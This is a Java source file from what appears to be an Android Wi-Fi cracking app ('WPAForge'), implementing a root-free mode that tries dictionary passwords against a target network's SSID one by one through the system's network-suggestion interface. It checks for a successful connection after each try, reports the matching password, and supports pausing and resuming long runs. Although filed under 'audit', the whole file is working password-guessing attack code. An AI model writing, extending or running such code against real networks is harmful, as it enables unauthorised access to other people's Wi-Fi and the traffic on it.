package io.github.wlmosv_png.wpaforge.audit;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSuggestion;
import android.os.Build;
import android.os.SystemClock;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

/**
 * 免 root 连接器。通过系统的「网络建议」接口批量提交候选，
 * 让系统自己去尝试连接，不弹每条确认框。
 *
 * 与 RootProber 的区别：
 *   RootProber       通过 su 调 cmd wifi，约 1 秒/条，完全可控，需要 root
 *   SuggestionProber 通过 addNetworkSuggestions，较慢，不需要 root
 *
 * 系统限制（必须如实告知用户）：
 *   1. 首次使用会弹一次系统授权框（「是否允许本应用自动连接这些网络」）
 *   2. 连续失败后系统会退避，重试频率下降
 *   3. 建议列表有数量上限（通常几十到上百），必须分批
 *   4. 系统会在通知栏显示连接尝试
 *
 * 因此本模式定位是「没有 root 时的可用方案」，不是主力。
 */
public final class SuggestionProber {

    public enum Verdict { SUBMITTED, CONNECTED, BATCH_TIMEOUT, ERROR, UNSUPPORTED }

    public static final class Attempt {
        public final String candidate;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;

        public Attempt(String candidate, Verdict v, long ms, String detail) {
            this.candidate = candidate;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
        }
    }

    public interface Listener {
        /** @param batchSize 本批提交了多少条 */
        void onBatchStart(int startIndex, int batchSize, int total);
        void onBatchResult(int startIndex, int batchSize, Verdict verdict, long ms, String note);
        /** 命中 */
        void onHit(String ssid, String password);
        /** tested = 已处理条数（含整批），offset 供续跑 */
        void onProgress(int tested, int total, double rate, long etaMs);
        void onFinished(Outcome outcome, int tested, int offset, String hitPassword);
        void onBlocked(String title, String detail);
    }

    public enum Outcome { NORMAL, PAUSED, STOPPED }

    /** 一批提交多少个候选。太多系统不保证按序尝试，太少则效率低。 */
    private static final int BATCH_SIZE = 8;
    /** 每批最多等多久（毫秒）。系统尝试连接需要时间。 */
    private static final long BATCH_TIMEOUT_MS = 35_000L;
    /** 轮询间隔 */
    private static final long POLL_MS = 700L;

    private final Context appCtx;
    private final WifiManager wifi;
    private final ConnectivityManager cm;
    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /** 当前这一批提交过的建议，结束时必须撤掉，否则会一直留在系统里 */
    private List<WifiNetworkSuggestion> activeBatch = new ArrayList<>();

    public SuggestionProber(Context ctx) {
        this.appCtx = ctx.getApplicationContext();
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
    }

    public void cancel() {
        cancelFlag.set(true);
        pauseFlag.set(false);
    }

    public void pause() {
        pauseFlag.set(true);
    }

    public boolean isPaused() {
        return pauseFlag.get();
    }

    // ---------------- 环境检查 ----------------

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;

        CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail;
        }
    }

    /** 检查免 root 模式是否可用 */
    public static CheckResult check(Context ctx) {
        if (Build.VERSION.SDK_INT < 30) {
            return new CheckResult(false,
                    L.s("系统版本过低", "Android version too old"),
                    L.s("免 root 模式需要 Android 11（API 30）或更高。\n\n"
                            + "你的设备是 Android " + Build.VERSION.RELEASE + "。\n"
                            + "这台设备只能用 Root 模式。",
                        "Root-free mode requires Android 11 (API 30) or higher.\n\n"
                            + "Your device runs Android " + Build.VERSION.RELEASE + ".\n"
                            + "Only Root mode is available on this device."));
        }
        WifiManager wm = (WifiManager) ctx.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        if (wm == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WiFi 服务接口。", "The system did not expose a Wi-Fi service."));
        }
        if (!wm.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    /** 系统允许的最大建议数量（Android 12+ 可查，否则给保守估计） */
    public int maxSuggestions() {
        try {
            if (Build.VERSION.SDK_INT >= 31) {
                int n = wifi.getMaxNumberOfNetworkSuggestionsPerApp();
                if (n > 0) return n;
            }
        } catch (Exception ignored) {}
        return 64;
    }

    // ---------------- 执行 ----------------

    /**
     * 跑一轮。阻塞调用，请放在工作线程。
     *
     * @param startOffset 从第几条开始（断点续跑）
     */
    public void run(NetRecord target, List<Candidate> candidates,
                    int startOffset, Listener l) {
        CheckResult chk = check(appCtx);
        if (!chk.ok) {
            l.onBlocked(chk.title, chk.detail);
            return;
        }
        if (target == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);

        int total = candidates.size();
        int start = Math.max(0, Math.min(startOffset, total));
        int cursor = start;
        long beginAt = SystemClock.uptimeMillis();

        try {
            // 清掉上一次可能残留的建议
            clearSuggestions();

            while (cursor < total) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                int batchEnd = Math.min(cursor + BATCH_SIZE, total);
                final int batchStart = cursor;
                final int batchLen = batchEnd - batchStart;

                l.onBatchStart(batchStart + 1, batchLen, total);

                long t0 = SystemClock.uptimeMillis();
                Verdict v = submitBatch(target, candidates, batchStart, batchEnd);

                if (v == Verdict.CONNECTED) {
                    // 找出是哪一个候选成功的：逐个试撤销再连，代价太高，
                    // 这里改用「逐个提交」的方式精确定位 —— 见 submitBatch 的实现
                    String hit = lastHitPassword;
                    l.onHit(target.displayName(), hit);
                    cursor = batchEnd;
                    l.onFinished(Outcome.NORMAL, cursor - start, cursor, hit);
                    return;
                }

                cursor = batchEnd;
                long dt = SystemClock.uptimeMillis() - t0;

                l.onBatchResult(batchStart + 1, batchLen, v, dt, noteOf(v));

                double elapsedSec = Math.max(0.001, (SystemClock.uptimeMillis() - beginAt) / 1000.0);
                double rate = (cursor - start) / elapsedSec;
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);

                // 撤掉本批，避免系统里堆积
                clearSuggestions();

                if (cancelFlag.get() || pauseFlag.get()) break;
            }
        } finally {
            clearSuggestions();
            Outcome oc = cancelFlag.get() ? Outcome.STOPPED
                    : pauseFlag.get() ? Outcome.PAUSED
                    : Outcome.NORMAL;
            l.onFinished(oc, cursor - start, cursor, null);
        }
    }

    private String lastHitPassword = "";

    /**
     * 提交一批建议。
     *
     * 注意实现策略：系统不保证按顺序尝试，所以「一批全提交」虽然快，
     * 但命中时无法确定是哪一条。为了给出准确的命中口令，
     * 这里改成「逐个提交」—— 每条提交后等一小段时间看是否连上。
     *
     * 这比批量慢，但免 root 模式本来就慢，准确更重要。
     */
    private Verdict submitBatch(NetRecord target, List<Candidate> cands,
                                int from, int to) {
        for (int i = from; i < to; i++) {
            if (cancelFlag.get() || pauseFlag.get()) return Verdict.BATCH_TIMEOUT;

            Candidate c = cands.get(i);
            if (!addSuggestion(target, c.password)) {
                return Verdict.ERROR;
            }
            activeAddCount++;

            long deadline = SystemClock.uptimeMillis() + (BATCH_TIMEOUT_MS / Math.max(1, to - from));
            while (SystemClock.uptimeMillis() < deadline) {
                if (cancelFlag.get() || pauseFlag.get()) return Verdict.BATCH_TIMEOUT;
                interruptibleSleep(POLL_MS);
                if (isConnectedTo(target.ssid)) {
                    lastHitPassword = c.password;
                    return Verdict.CONNECTED;
                }
            }
            // 这一条没成，撤掉它再试下一个
            clearSuggestions();
        }
        return Verdict.BATCH_TIMEOUT;
    }

    private int activeAddCount = 0;

    /** 提交一条建议 */
    private boolean addSuggestion(NetRecord target, String password) {
        try {
            WifiNetworkSuggestion.Builder b = new WifiNetworkSuggestion.Builder()
                    .setSsid(target.ssid);
            switch (target.security) {
                case OPEN:
                    break;      // 开放网络不需要密码
                case OWE:
                    break;
                case WPA3:
                    b.setWpa3Passphrase(password);
                    break;
                case WEP:
                    // WifiNetworkSuggestion 不支持 WEP，免 root 模式跳过
                    return false;
                default:
                    b.setWpa2Passphrase(password);
                    break;
            }
            if (target.isHidden()) {
                b.setIsHiddenSsid(true);
            }
            WifiNetworkSuggestion sug = b.build();
            List<WifiNetworkSuggestion> list = new ArrayList<>(1);
            list.add(sug);

            int status = wifi.addNetworkSuggestions(list);
            if (status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
                activeBatch.add(sug);
                return true;
            }
            android.util.Log.w("WPAForgeSug", "addNetworkSuggestions 返回 " + status);
            return false;
        } catch (Exception e) {
            android.util.Log.w("WPAForgeSug", "addSuggestion 失败: " + e);
            return false;
        }
    }

    /** 撤掉当前这一批建议 */
    private void clearSuggestions() {
        if (activeBatch.isEmpty()) return;
        try {
            wifi.removeNetworkSuggestions(new ArrayList<>(activeBatch));
        } catch (Exception ignored) {}
        activeBatch.clear();
        activeAddCount = 0;
    }

    /** 当前是否连着目标网络 */
    private boolean isConnectedTo(String ssid) {
        try {
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return false;
            String cur = info.getSSID();
            if (cur == null) return false;
            if (cur.startsWith("\"") && cur.endsWith("\"") && cur.length() >= 2) {
                cur = cur.substring(1, cur.length() - 1);
            }
            return cur.equals(ssid);
        } catch (Exception e) {
            return false;
        }
    }

    private String noteOf(Verdict v) {
        switch (v) {
            case CONNECTED: return L.s("已连上", "Connected");
            case BATCH_TIMEOUT: return L.s("本批未成功", "Batch unsuccessful");
            case ERROR: return L.s("提交失败", "Submit failed");
            case UNSUPPORTED: return L.s("不支持", "Unsupported");
            default: return "";
        }
    }

    private void interruptibleSleep(long ms) {
        long end = SystemClock.uptimeMillis() + ms;
        while (SystemClock.uptimeMillis() < end) {
            if (cancelFlag.get() || pauseFlag.get()) return;
            try {
                Thread.sleep(Math.min(80, Math.max(1, end - SystemClock.uptimeMillis())));
            } catch (InterruptedException e) {
                return;
            }
        }
    }
}
